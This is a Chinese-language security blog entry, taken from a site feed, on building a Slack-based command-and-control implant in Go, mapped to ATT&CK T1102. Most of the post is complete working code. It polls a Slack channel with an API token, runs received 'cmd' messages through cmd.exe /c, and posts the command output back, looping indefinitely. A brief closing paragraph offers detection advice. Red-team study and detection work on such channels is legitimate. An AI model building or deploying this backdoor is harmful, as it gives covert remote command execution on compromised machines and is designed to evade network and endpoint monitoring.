            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>slack C2 golang编写(T1102)</title>
      <link href="/slack%20C2%20golang.html"/>
      <url>/slack%20C2%20golang.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/354B06159AA7196E0F0FC10CE498DE21.jpg" alt="enter description here"></p><span id="more"></span><h3 id=""><a href="#" class="headerlink" title="&lt;iframe"></a>&lt;iframe</h3><pre><code>width=&quot;800&quot; height=&quot;450&quot; src=&#39;https://demonsec666.oss-cn-qingdao.aliyuncs.com/Slackc2.mp4&#39;frameborder=&quot;0&quot; allowfullscreen&gt;</code></pre></iframe><p> Slack 是聊天群组 + 大规模工具集成 + 文件整合 + 统一搜索。截至2014年底，Slack 已经整合了电子邮件、短信、Google Drives、Twitter、Trello、Asana、GitHub 等 65 种工具和服务，可以把各种碎片化的企业沟通和协作集中到一起 。</p><h3 id="2-slackC2"><a href="#2-slackC2" class="headerlink" title="2.slackC2"></a>2.slackC2</h3><p>​       因前阵子正好在找资料的时候发现一篇文章“ <strong>SLUB最新变种分析：仅靠 Slack进行C2通信”</strong> ，感觉还是比较有意思的，所以抽空打算做下实验对其记录下。</p><p>​      思路其实大同小异，也是差不多可以借鉴参考开源的代码。<code>https://github.com/bkup/SlackShell</code></p><p>​      一旦公开了此功能，它便受到了许多恶意软件创建者的欢迎，因为它提供了利用现有平台的好处。攻击者无需闯入Slack，他们只需使用其功能来控制植入到公司网络中的恶意软件即可。更重要的是，这种Slack作为通信渠道的合法使用将使黑客避免使用传统的安全机制（例如EDR和数据包捕获NTA）进行检测。Slack API URL结构也将被证明是对安全机制的检测挑战。所有Slack API URL的格式都与<a href="https://slack.com/api/[METHOD">https://slack.com/api/[METHOD</a> ] 相同 ，这意味着未加密的DNS查询仅显示slack.com的分辨率，这使得将Slack API的使用与正常的网络浏览区分开来非常困难。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-11.png" alt="11"></p><p>​     恶意软件创建者可能会使用Slack作为主要或辅助C2渠道，并使用其他平台（如Github）进行备份。由于这些应用程序是合法的，并且经常用于移动文件，因此防病毒或终结点解决方案几乎不会检测到恶意代码的渗透或敏感数据的泄漏的风险。尽管使用通用应用程序的概念并不是什么新鲜事（通过将Twitter用作C2渠道，尤其是<a href="https://web.archive.org/web/20100516175402/http:/sunbeltblog.blogspot.com/2010/05/diy-twitter-botnet-creator.html">Twitter bot构建器</a>，已经进行了较早的尝试 ），但Slack的普遍采用将这种操作方法提升到了一个全新的水平。</p><p>​     这个新发现的沟通渠道是黑客与防御者之间战斗的又一步。它着重说明了需要利用基于机器的群集分析的安全工具，以提供更多有关行为的信息，以揭示整个攻击范围。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-1.png" alt="1"></p><h3 id="3-客户端poc功能思路编写"><a href="#3-客户端poc功能思路编写" class="headerlink" title="3.客户端poc功能思路编写"></a>3.客户端poc功能思路编写</h3><p>1.服务端指定频道发送命令，由客户端接收</p><p>2.客户端接收服务端接收指令，执行命令</p><p>3.客户端执行结果，返回传送给服务端。</p><p>4.指定服务端命令标识，让客户端判定是否为命令</p><p>条件（指定频道、slack token和slack api）</p><p>Slack API 整理（发送信息，频道信息接收）</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-2.png" alt="2"></p><h3 id="4-API测试"><a href="#4-API测试" class="headerlink" title="4.API测试"></a>4.API测试</h3><p>以下为slack 官方API 测试地址</p><p> <a href="https://api.slack.com/methods/chat.postMessage">https://api.slack.com/methods/chat.postMessage</a> </p><p> <a href="https://api.slack.com/methods/conversations.history">https://api.slack.com/methods/conversations.history</a> </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-4.png" alt="4"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-3.png" alt="3"></p><p>另外我们需要几个参数 一个为token，另一个为channel</p><p>那么channel可以在 <a href="https://app.slack.com/client/TMFHAPNTS/xxxxx%EF%BC%8C%E7%99%BB%E5%BD%95%E5%90%8E%E6%89%BE%E7%9A%84ID">https://app.slack.com/client/TMFHAPNTS/xxxxx，登录后找的ID</a></p><p>而token 可在 <a href="https://api.slack.com/legacy/custom-integrations/legacy-tokens">https://api.slack.com/legacy/custom-integrations/legacy-tokens</a>  中获取</p><p><strong>发送频道信息</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-5.png" alt="5"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-6.png" alt="6"></p><p><strong>查询频道信息</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-7.png" alt="7"></p><h3 id="5-golang功能编写"><a href="#5-golang功能编写" class="headerlink" title="5.golang功能编写"></a>5.golang功能编写</h3><h4 id="5-1-打印频道信息"><a href="#5-1-打印频道信息" class="headerlink" title="5.1 打印频道信息"></a>5.1 打印频道信息</h4><p>首先定义API、tokon、频道信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">History_api = <span class="string">&quot;https://slack.com/api/conversations.history&quot;</span></span><br><span class="line">PostMessage = <span class="string">&quot;https://slack.com/api/chat.postMessage&quot;</span></span><br><span class="line">Token       = <span class="string">&quot;xoxp-729588xxxxxxx&quot;</span></span><br><span class="line">Channel     = <span class="string">&quot;xxxxxx&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>然后再定义中文编码的问题</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> utils</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;golang.org/x/text/encoding/simplifiedchinese&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Charset <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">UTF8    = Charset(<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">GB18030 = Charset(<span class="string">&quot;GB18030&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConvertByte2String</span><span class="params">(<span class="type">byte</span> []<span class="type">byte</span>, charset Charset)</span></span> <span class="type">string</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str <span class="type">string</span></span><br><span class="line"><span class="keyword">switch</span> charset &#123;</span><br><span class="line"><span class="keyword">case</span> GB18030:</span><br><span class="line"><span class="keyword">var</span> decodeBytes, _ = simplifiedchinese.GB18030.NewDecoder().Bytes(<span class="type">byte</span>)</span><br><span class="line">str = <span class="type">string</span>(decodeBytes)</span><br><span class="line"><span class="keyword">case</span> UTF8:</span><br><span class="line"><span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">str = <span class="type">string</span>(<span class="type">byte</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面开始定义main函数的内容</p><p><strong>指定频道和token 查看频道的信息</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">req, err := http.NewRequest(<span class="string">&quot;GET&quot;</span>, utils.History_api, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// GET URL  获取频道的字符串内容</span></span><br><span class="line">q := req.URL.Query()</span><br><span class="line">q.Add(<span class="string">&quot;token&quot;</span>, utils.Token)</span><br><span class="line">q.Add(<span class="string">&quot;channel&quot;</span>, utils.Channel)</span><br><span class="line">q.Add(<span class="string">&quot;pretty&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">req.URL.RawQuery = q.Encode()</span><br><span class="line"><span class="keyword">var</span> resp *http.Response</span><br><span class="line">resp, err = http.DefaultClient.Do(req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// fmt.Println(url)</span></span><br><span class="line"><span class="comment">//defer resp.Body.Close()</span></span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">resp.Body.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// handle error</span></span><br><span class="line">&#125;</span><br><span class="line">json := <span class="type">string</span>(body)</span><br><span class="line"><span class="comment">//将GET URL 中的json值赋值给json变量</span></span><br><span class="line"></span><br><span class="line">text := gjson.Get(json, <span class="string">&quot;messages.0.text&quot;</span>)</span><br><span class="line">fmt.Print(text)</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-8.png" alt="8"></p><h4 id="5-2-发送信息给频道"><a href="#5-2-发送信息给频道" class="headerlink" title="5.2 发送信息给频道"></a>5.2 发送信息给频道</h4><p><strong>使用post 传参发送hello,i am xxxx指定频道</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">req, err := http.NewRequest(<span class="string">&quot;POST&quot;</span>, utils.PostMessage, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">p := req.URL.Query()</span><br><span class="line">p.Add(<span class="string">&quot;token&quot;</span>, utils.Token)</span><br><span class="line">p.Add(<span class="string">&quot;channel&quot;</span>, utils.Channel)</span><br><span class="line">p.Add(<span class="string">&quot;pretty&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.Add(<span class="string">&quot;text&quot;</span>, <span class="string">&quot;hello,i am xxxx&quot;</span>)</span><br><span class="line">req.URL.RawQuery = p.Encode()</span><br><span class="line"><span class="keyword">var</span> resp *http.Response</span><br><span class="line">resp, err = http.DefaultClient.Do(req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">&#125;</span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// handle error</span></span><br><span class="line">&#125;</span><br><span class="line">postMessage := <span class="type">string</span>(body)</span><br><span class="line">OUTPUT := gjson.Get(postMessage, <span class="string">&quot;message.0&quot;</span>)</span><br><span class="line">log.Println(OUTPUT)</span><br><span class="line"><span class="comment">//fmt.Println()用于将输出的结果返回到slack频道中</span></span><br><span class="line">resp.Body.Close()</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-9.png" alt="9"></p><h4 id="5-3指定命令标识"><a href="#5-3指定命令标识" class="headerlink" title="5.3指定命令标识"></a>5.3指定命令标识</h4><p>指定服务端命令标识，让客户端判定是否为命令</p><p>思路为，获取频道信息的字符串，如果发送过来的标识为<strong>”cmd  xxxxx“</strong>，则为执行命令，如果不是，则跳过。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">text := gjson.Get(json, <span class="string">&quot;messages.0.text&quot;</span>)</span><br><span class="line"><span class="comment">// fmt.Print(text)</span></span><br><span class="line">cmd := strings.Split(text.String(), <span class="string">&quot; &quot;</span>)</span><br><span class="line">m := <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">struct</span>&#123;&#125;&#123; <span class="comment">//定义列表命令</span></span><br><span class="line"><span class="string">&quot;cmd&quot;</span>: &#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">cmdlist := cmd[<span class="number">0</span>] <span class="comment">//slack频道输出的字符串第一个元素如果是列表中的就执行以下内容</span></span><br><span class="line"><span class="comment">// fmt.Println(cmd[1])</span></span><br><span class="line"><span class="keyword">if</span> _, run := m[cmdlist]; run &#123;</span><br><span class="line"><span class="keyword">if</span> cmdlist == <span class="string">&quot;cmd&quot;</span> &#123;</span><br><span class="line"><span class="comment">//判断接受过来的字符第一个元素是否为cmd字符串，【用于执行命令】</span></span><br><span class="line"><span class="comment">// if runtime.GOOS == &quot;windows&quot; &#123;</span></span><br><span class="line">command := exec.Command(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd[<span class="number">1</span>])</span><br><span class="line"><span class="comment">// &#125; else &#123;</span></span><br><span class="line"><span class="comment">// command := exec.Command(cmd[1])</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//取值为第二元素为服务端接受的命令，并执行命令</span></span><br><span class="line">stdoutStderr, err := command.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="完整效果"><a href="#完整效果" class="headerlink" title="完整效果"></a>完整效果</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-10.png" alt="10"></p><h3 id="6-完整代码"><a href="#6-完整代码" class="headerlink" title="6.完整代码"></a>6.完整代码</h3><p><strong>utils.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> utils</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;golang.org/x/text/encoding/simplifiedchinese&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Charset <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">UTF8    = Charset(<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">GB18030 = Charset(<span class="string">&quot;GB18030&quot;</span>)</span><br><span class="line">History_api = <span class="string">&quot;https://slack.com/api/conversations.history&quot;</span></span><br><span class="line">PostMessage = <span class="string">&quot;https://slack.com/api/chat.postMessage&quot;</span></span><br><span class="line">Token       = <span class="string">&quot;xoxp-729588xxxxxxx&quot;</span></span><br><span class="line">Channel     = <span class="string">&quot;xxxxxx&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConvertByte2String</span><span class="params">(<span class="type">byte</span> []<span class="type">byte</span>, charset Charset)</span></span> <span class="type">string</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str <span class="type">string</span></span><br><span class="line"><span class="keyword">switch</span> charset &#123;</span><br><span class="line"><span class="keyword">case</span> GB18030:</span><br><span class="line"><span class="keyword">var</span> decodeBytes, _ = simplifiedchinese.GB18030.NewDecoder().Bytes(<span class="type">byte</span>)</span><br><span class="line">str = <span class="type">string</span>(decodeBytes)</span><br><span class="line"><span class="keyword">case</span> UTF8:</span><br><span class="line"><span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">str = <span class="type">string</span>(<span class="type">byte</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>main.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">utils <span class="string">&quot;slackc2/core&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/tidwall/gjson&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="literal">true</span> &#123;</span><br><span class="line">req, err := http.NewRequest(<span class="string">&quot;GET&quot;</span>, utils.History_api, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// GET URL  获取频道的字符串内容</span></span><br><span class="line">q := req.URL.Query()</span><br><span class="line">q.Add(<span class="string">&quot;token&quot;</span>, utils.Token)</span><br><span class="line">q.Add(<span class="string">&quot;channel&quot;</span>, utils.Channel)</span><br><span class="line">q.Add(<span class="string">&quot;pretty&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">req.URL.RawQuery = q.Encode()</span><br><span class="line"><span class="keyword">var</span> resp *http.Response</span><br><span class="line">resp, err = http.DefaultClient.Do(req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// fmt.Println(url)</span></span><br><span class="line"><span class="comment">//defer resp.Body.Close()</span></span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">resp.Body.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// handle error</span></span><br><span class="line">&#125;</span><br><span class="line">json := <span class="type">string</span>(body)</span><br><span class="line"><span class="comment">//将GET URL 中的json值赋值给json变量</span></span><br><span class="line"></span><br><span class="line">text := gjson.Get(json, <span class="string">&quot;messages.0.text&quot;</span>)</span><br><span class="line"><span class="comment">// fmt.Print(text)</span></span><br><span class="line">cmd := strings.Split(text.String(), <span class="string">&quot; &quot;</span>)</span><br><span class="line">m := <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">struct</span>&#123;&#125;&#123; <span class="comment">//定义列表命令</span></span><br><span class="line"><span class="string">&quot;cmd&quot;</span>: &#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">cmdlist := cmd[<span class="number">0</span>] <span class="comment">//slack频道输出的字符串第一个元素如果是列表中的就执行以下内容</span></span><br><span class="line"><span class="comment">// fmt.Println(cmd[1])</span></span><br><span class="line"><span class="keyword">if</span> _, run := m[cmdlist]; run &#123;</span><br><span class="line"><span class="keyword">if</span> cmdlist == <span class="string">&quot;cmd&quot;</span> &#123;</span><br><span class="line"><span class="comment">//判断接受过来的字符第一个元素是否为cmd字符串，【用于执行命令】</span></span><br><span class="line"><span class="comment">// if runtime.GOOS == &quot;windows&quot; &#123;</span></span><br><span class="line">command := exec.Command(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd[<span class="number">1</span>])</span><br><span class="line"><span class="comment">// &#125; else &#123;</span></span><br><span class="line"><span class="comment">// command := exec.Command(cmd[1])</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//取值为第二元素为服务端接受的命令，并执行命令</span></span><br><span class="line">stdoutStderr, err := command.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">output := utils.ConvertByte2String(stdoutStderr, utils.GB18030)</span><br><span class="line">str := <span class="string">&quot;output-&quot;</span> + output</span><br><span class="line"><span class="comment">//以发送cmd输出的信息输出到output，并发送到频道</span></span><br><span class="line"><span class="comment">// postMessage URL用于将输出的结果发送到slack频道中</span></span><br><span class="line">req, err := http.NewRequest(<span class="string">&quot;POST&quot;</span>, utils.PostMessage, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">p := req.URL.Query()</span><br><span class="line">p.Add(<span class="string">&quot;token&quot;</span>, utils.Token)</span><br><span class="line">p.Add(<span class="string">&quot;channel&quot;</span>, utils.Channel)</span><br><span class="line">p.Add(<span class="string">&quot;pretty&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.Add(<span class="string">&quot;text&quot;</span>, str)</span><br><span class="line">req.URL.RawQuery = p.Encode()</span><br><span class="line"><span class="keyword">var</span> resp *http.Response</span><br><span class="line">resp, err = http.DefaultClient.Do(req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">&#125;</span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// handle error</span></span><br><span class="line">&#125;</span><br><span class="line">postMessage := <span class="type">string</span>(body)</span><br><span class="line">OUTPUT := gjson.Get(postMessage, <span class="string">&quot;message.0&quot;</span>)</span><br><span class="line">log.Println(OUTPUT)</span><br><span class="line"><span class="comment">//fmt.Println()用于将输出的结果返回到slack频道中</span></span><br><span class="line">resp.Body.Close()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Slackc2.mp4'    frameborder="0"     allowfullscreen></iframe><h3 id="7-总结"><a href="#7-总结" class="headerlink" title="7.总结"></a>7.总结</h3><p>​    可以使用网络连接来关联未知或可疑过程活动的主机数据对于补充基于恶意软件命令和控制签名，基础结构或强加密的存在的任何现有危害指标至关重要。如果数据已加密，则数据包捕获分析将需要SSL&#x2F;TLS检查。分析网络数据中不常见的数据流（例如，客户端发送的数据比从服务器接收的数据多得多）。行为监视可能有助于检测异常活动模式 。</p><p><strong>参考链接：</strong></p><p> <a href="https://github.com/bkup/SlackShell">https://github.com/bkup/SlackShell</a> </p><p> <a href="https://blog.csdn.net/systemino/article/details/97636359">https://blog.csdn.net/systemino/article/details/97636359</a> </p><p> <a href="https://api.slack.com/methods/chat.postMessage">https://api.slack.com/methods/chat.postMessage</a> </p><p> <a href="https://api.slack.com/methods/conversations.history">https://api.slack.com/methods/conversations.history</a> </p><p> <a href="https://www.praetorian.com/blog/using-slack-as-c2-channel-mitre-attack-web-service-t1102?edition=2019">https://www.praetorian.com/blog/using-slack-as-c2-channel-mitre-attack-web-service-t1102?edition=2019</a> </p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit后渗透模块编写ATT&amp;CK-T1118</title>
      <link href="/metasploit%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99ATT&amp;CK-T1118.html"/>
      <url>/metasploit%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99ATT&amp;CK-T1118.html</url>
      
